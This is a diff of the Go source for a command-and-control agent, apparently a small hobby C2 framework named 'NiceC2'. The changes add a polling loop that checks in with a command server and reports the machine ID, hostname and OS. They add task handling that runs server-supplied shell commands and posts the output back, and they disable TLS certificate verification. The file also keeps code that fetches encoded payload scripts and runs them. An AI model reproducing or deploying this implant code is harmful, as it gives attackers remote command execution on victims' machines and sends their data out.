@@ -2,8 +2,10 @@ package main
 
 import (
 	"bytes"
+	"crypto/tls"
 	"encoding/json"
 	"fmt"
+	"time"
 
 	// "io/ioutil"
 	b64 "encoding/base64"
@@ -11,20 +13,46 @@ import (
 	"net/http"
 	"os"
 	"os/exec"
-	"path/filepath"
 	"runtime"
 	"strings"
-	"time"
 
 	"github.com/denisbrodbeck/machineid"
 	// "github.com/mitchellh/go-homedir"
 )
 
+// Setting the command server
 // var command_server string = "http://192.168.0.69:8081"
 
-var command_server string = "http://localhost:8081"
+var command_server string = "https://localhost:8081"
 
+// var command_server string = "http://192.168.0.29:8081"
+
+// Variables assigned later
 var NodeID string = "" // This will be a GUID at some point
+
+type CheckIn struct {
+	ID       string `json:"ID"`
+	Hostname string `json: "Hostname"`
+	Platform string `json:"Platform"`
+}
+
+type CheckIn_response struct {
+	TaskID string `json:"taskID"`
+	Task   string `json:"task"`
+	Arg    string `json:"arg"`
+}
+
+type command struct {
+	ID      string `json:"ID"`
+	Command string `json:"command"`
+	Details string `json:"details"`
+}
+
+type Task_Response struct {
+	TaskID   string
+	Progress string // Completed / Failed
+	Result   string // Data from the task
+}
 
 // Checking errors
 func check(e error) {
@@ -38,75 +66,50 @@ var p = fmt.Println
 
 func main() {
 
+	Banner := `
+███████████████████████████████████████████████████████████████████████████████████████████████
+███    ██ ██  ██████ ███████  ██████ ██████       █████   ██████  ███████ ███    ██ ████████  
+████   ██ ██ ██      ██      ██           ██     ██   ██ ██       ██      ████   ██    ██    
+██ ██  ██ ██ ██      █████   ██       █████      ███████ ██   ███ █████   ██ ██  ██    ██    
+██  ██ ██ ██ ██      ██      ██      ██          ██   ██ ██    ██ ██      ██  ██ ██    ██    
+██   ████ ██  ██████ ███████  ██████ ███████     ██   ██  ██████  ███████ ██   ████    ██    
+███████████████████████████████████████████████████████████████████████████████████████████████                                                                                                                                                                                       
+`
+
+	fmt.Println(Banner)
+
 	NodeID, _ = machineid.ID()
+	// NodeID = "THis is a test 99"
 
-	checkIn()
+	// Checks in every 10 seconds.
+	for {
+		time.Sleep(5 * time.Second)
 
-	getFIle()
+		checkIn()
 
-	scriptOutput := run_script("payloads/shell.sh")
-
-	fmt.Println(scriptOutput)
-
-	// Get's the current time, and formats it. god this is weird
-	current_time := time.Now().Format("2006.01.02 15:04:05")
-
-	var home string
-	home, _ = os.UserHomeDir()
-
-	var testFile string
-	testFile = filepath.Join(home, "Desktop", "NiceC2 Log file.txt")
-
-	fmt.Println(testFile)
-
-	// Opens/creates the file in a way that it can be appended to
-	file, err := os.OpenFile(testFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
-
-	// Error if you can't open/edit the file
-	if err != nil {
-		fmt.Println("Could not open example.txt")
-		return
 	}
 
-	defer file.Close()
-
-	_, err2 := file.WriteString("The time is: " + current_time + "\n")
-
-	if err2 != nil {
-		fmt.Println("Could not write text to example.txt")
-
-	} else {
-		fmt.Println("Operation successful! Text has been appended to example.txt")
-	}
-
-	// // Sleeps 10 seconds, then does it again. Damn look at that recursion
-	// time.Sleep(10 * time.Second)
-	// main()
+	// checkIn()
 
 }
 
-type CheckIn struct {
-	ID string `json:"ID"`
-}
+func send_response(response_to_task Task_Response) {
+	// This allows us to use a self signed certificate.
+	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
 
-type command struct {
-	ID      string `json:"ID"`
-	Command string `json:"command"`
-	Details string `json:"details"`
-}
-
-func checkIn() {
-
-	data := map[string]string{"ID": NodeID}
+	// This seems very wrong. But seems to work
+	data := map[string]string{"TaskID": response_to_task.TaskID, "Progress": response_to_task.Progress, "Result": response_to_task.Result}
 
 	json_data, err := json.Marshal(data)
 	if err != nil {
 		log.Fatal(err)
+
 	}
 
-	r, err := http.NewRequest("POST", command_server+"/checkin", bytes.NewBuffer(json_data))
+	r, err := http.NewRequest("POST", command_server+"/node_response", bytes.NewBuffer(json_data))
 	if err != nil {
-		panic(err)
+		// panic(err)
+		fmt.Println("Error sending the commands response back")
 	}
 
 	// Add the header to say that it's json
@@ -116,34 +119,95 @@ func checkIn() {
 	client := &http.Client{}
 	res, err := client.Do(r)
 	if err != nil {
-		panic(err)
+		// panic(err)
+		fmt.Println("Error sending the commands response back")
+	}
+
+	fmt.Println(res.Body)
+
+}
+
+func checkIn() {
+
+	// This allows us to use a self signed certificate.
+	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
+
+	// Getting the info
+	hostname, _ := os.Hostname()
+	platform := runtime.GOOS
+
+	data := map[string]string{"ID": NodeID, "Hostname": hostname, "Platform": platform}
+
+	json_data, err := json.Marshal(data)
+	if err != nil {
+		// log.Fatal(err)
+		fmt.Println("error Marshalling the JSON sent by the server")
+	}
+
+	r, err := http.NewRequest("POST", command_server+"/checkin", bytes.NewBuffer(json_data))
+	if err != nil {
+		fmt.Println("Error posting to command server")
+		return
+	}
+
+	// Add the header to say that it's json
+	r.Header.Add("Content-Type", "application/json")
+
+	//Create a client to send the data and then send it
+	client := &http.Client{}
+	res, err := client.Do(r)
+	if err != nil {
+		fmt.Println("Error sending data back to command server")
+		return
 	}
 
 	//shrug
 	defer res.Body.Close()
 
-	fmt.Println(res.StatusCode)
+	// Bit of UI for you
+	if res.StatusCode == 200 {
+		fmt.Println("Response was OK")
+	} else {
+		fmt.Println("Response was Not OK")
+	}
 
-	fmt.Println("here")
-
-	// Parse the JSON response
-	post := &command{}
+	post := &CheckIn_response{}
 	derr := json.NewDecoder(res.Body).Decode(post)
 	if derr != nil {
+		fmt.Println("Error decoding the JSON")
 		panic(derr)
 	}
 
-	fmt.Println("And here")
-	// Output the JSON response
-	fmt.Println("ID: ", post.ID)
-	fmt.Println("Command: ", post.Command)
-	fmt.Println("Details: ", post.Details)
+	fmt.Println("Details of response")
+	fmt.Println("Task: " + post.Task)
+	fmt.Println("Arg: " + post.Arg)
 
-	// If the command is run, then the the command
-	if post.Command == "run" {
-		runCommand(post.Details)
+	// Handeling it if there is no new task
+	if post.TaskID == "0" {
+		fmt.Println("No new task")
+		return
 	}
 
+	// This is is where the tasks that the node should then do need to go
+	switch post.Task {
+	case "run script":
+		fmt.Println("Hello there")
+	case "shutdown":
+		shutdown()
+	case "run command":
+		go handle_runCommand(post.TaskID, post.Arg)
+	default:
+		// Well if it doesn't match 🤷‍♀️
+
+	}
+
+}
+
+func shutdown() {
+
+	fmt.Println("Beep Boop. The computer should now shut down")
+
+	/// This is where the code to shutdown the PC will go
 }
 
 func getFIle() {
@@ -157,7 +221,7 @@ func getFIle() {
 		log.Fatal(err)
 	}
 
-	r, err := http.NewRequest("POST", command_server+"/payload", bytes.NewBuffer(json_data))
+	r, err := http.NewRequest("POST", command_server+"/old-payload", bytes.NewBuffer(json_data))
 	if err != nil {
 		panic(err)
 	}
@@ -200,6 +264,24 @@ func getFIle() {
 
 }
 
+// Runs a command based of a task. Then creates a response.
+func handle_runCommand(this_taskID string, command string) {
+
+	var response Task_Response
+
+	output, command_error_message := runCommand(command)
+	if command_error_message != "" {
+		response = Task_Response{this_taskID, "failed", output}
+	} else {
+		response = Task_Response{this_taskID, "complete", output}
+
+	}
+
+	send_response(response)
+
+}
+
+// Runs a command, and returns the output.
 func runCommand(command string) (outString string, errorMessage string) {
 
 	var shell string
@@ -225,7 +307,8 @@ func runCommand(command string) (outString string, errorMessage string) {
 		out, err := exec.Command(shell, "-c", "pwd").Output()
 		if err != nil {
 			p(err.Error())
-			errorMessage = err.Error()
+			// errorMessage = err.Error()
+			errorMessage = "There was an error executing. "
 
 			return
 		}
@@ -237,8 +320,10 @@ func runCommand(command string) (outString string, errorMessage string) {
 	// run command, and if it causes an error create an error
 	out, err := exec.Command(shell, "-c", command).Output()
 	if err != nil {
+
+		fmt.Println("There was an error. Ohh dear")
 		p(err.Error())
-		errorMessage = err.Error()
+		errorMessage = "There was an error running the command"
 
 		return
 	}
@@ -249,6 +334,7 @@ func runCommand(command string) (outString string, errorMessage string) {
 
 }
 
+// Converts an encoded script. To a script on the machine
 func script_to_file(input string) {
 
 	f, err := os.Create("payloads/shell.sh")
@@ -270,6 +356,7 @@ func script_to_file(input string) {
 	return
 }
 
+// Runs a script. Currently not OS agnostic
 func run_script(path_to_script string) (output string) {
 
 	output = ""
@@ -283,4 +370,16 @@ func run_script(path_to_script string) (output string) {
 
 	return output
 
+}
+
+// structToJSON converts a struct to a JSON string
+func structToJSON(v interface{}) (string, error) {
+	// Marshal the struct into a JSON string
+	jsonBytes, err := json.Marshal(v)
+	if err != nil {
+		return "", err
+	}
+
+	// Convert the JSON bytes to a striπng and return it
+	return string(jsonBytes), nil
 }
